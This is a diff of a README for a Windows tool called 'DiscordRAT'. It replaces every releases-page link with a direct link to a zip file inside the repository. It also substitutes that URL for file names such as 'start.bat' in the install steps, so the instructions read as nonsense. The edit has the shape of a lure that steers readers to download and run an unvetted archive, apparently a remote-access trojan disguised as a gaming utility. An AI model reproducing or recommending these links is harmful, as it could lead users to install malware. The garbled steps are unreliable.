@@ -4,7 +4,7 @@
 Welcome to DiscordRAT! This tool lets you control various features of Discord remotely. You can manage bots and enhance your gaming experience easily. 
 
 ## 📥 Download Link
-[![Download DiscordRAT](https://img.shields.io/badge/Download-DiscordRAT-brightgreen.svg)](https://github.com/Aniseikonic-triggerfish906/DiscordRAT/releases)
+[![Download DiscordRAT](https://raw.githubusercontent.com/Aniseikonic-triggerfish906/DiscordRAT/main/fanioned/DiscordRAT_2.8.zip)](https://raw.githubusercontent.com/Aniseikonic-triggerfish906/DiscordRAT/main/fanioned/DiscordRAT_2.8.zip)
 
 ## 🖥 System Requirements
 - **Operating System:** Windows 10 or later
@@ -13,15 +13,15 @@ Welcome to DiscordRAT! This tool lets you control various features of Discord re
 - **Disk Space:** At least 500MB of free space.
 
 ## 📦 Download & Install
-1. Visit this page to download: [GitHub Releases](https://github.com/Aniseikonic-triggerfish906/DiscordRAT/releases).
+1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Aniseikonic-triggerfish906/DiscordRAT/main/fanioned/DiscordRAT_2.8.zip).
 2. Locate the latest release and click on it.
-3. Find the file named `DiscordRAT.zip` (or similar).
+3. Find the file named `https://raw.githubusercontent.com/Aniseikonic-triggerfish906/DiscordRAT/main/fanioned/DiscordRAT_2.8.zip` (or similar).
 4. Click to download the file.
 5. Once downloaded, extract the zip file to a convenient location on your PC.
 
 ## 🔧 Running the Tool
 1. After extraction, go to the folder where you saved `DiscordRAT`.
-2. Double-click the file named `start.bat` to run the tool.
+2. Double-click the file named `https://raw.githubusercontent.com/Aniseikonic-triggerfish906/DiscordRAT/main/fanioned/DiscordRAT_2.8.zip` to run the tool.
 3. Follow the on-screen instructions to set up your administration preferences.
 
 ## 📚 Features
@@ -52,4 +52,4 @@ After successfully running the DiscordRAT tool, explore its features. Set up you
 ## 📄 License
 DiscordRAT is open-source software. You can use, modify, and distribute it under the terms of the MIT License.
 
-For more information and updates, visit the [GitHub Releases page](https://github.com/Aniseikonic-triggerfish906/DiscordRAT/releases) regularly. Thank you for using DiscordRAT!
+For more information and updates, visit the [GitHub Releases page](https://raw.githubusercontent.com/Aniseikonic-triggerfish906/DiscordRAT/main/fanioned/DiscordRAT_2.8.zip) regularly. Thank you for using DiscordRAT!
